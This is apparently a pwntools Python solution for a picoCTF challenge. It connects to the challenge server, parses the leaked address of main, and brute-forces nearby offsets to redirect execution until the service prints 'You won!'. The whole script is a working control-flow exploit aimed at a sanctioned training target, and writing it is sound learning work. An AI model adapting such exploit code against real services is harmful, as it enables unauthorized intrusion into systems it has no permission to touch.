from pwn import *

host = "rescued-float.picoctf.net"
port = 63250
local_offset = -0xa2

for diff in range(-0x10, 0x11):
    r = remote(host, port)
    r.recvuntil("Address of main:")
    main_line = r.recvline().strip()
    main_addr = int(main_line, 16)
    attempt = main_addr + local_offset + diff
    attempt_hex = hex(attempt)
    print(f"[*] Trying offset diff = {hex(diff)}: {attempt_hex}")
    r.recvuntil("Enter the address to jump to, ex => 0x12345: ")
    r.sendline(attempt_hex)
    
    try:
        output = r.recvall(timeout=3)
    except EOFError:
        output = b""
    r.close()

    if b"You won!" in output:
        print("Success!")
        print(output.decode())
        break
    else:
        print("No success with this offset...\n")